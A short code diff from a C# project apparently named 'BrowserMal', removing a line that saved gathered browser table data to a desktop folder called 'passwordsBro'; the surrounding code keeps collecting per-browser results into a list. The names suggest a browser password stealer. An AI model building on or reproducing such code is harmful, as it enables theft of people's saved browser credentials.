@@ -37,7 +37,6 @@ namespace BrowserMal.Manager
                         continue;
 
                     _resultList.Add($"{browser.Name}_{_tableName}.json", JsonUtil.GetJson<T>(result));
-                    Filesaver.FileManager.Save<T>(result, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{_tableName}.json");
                 }
 
                 return _resultList;
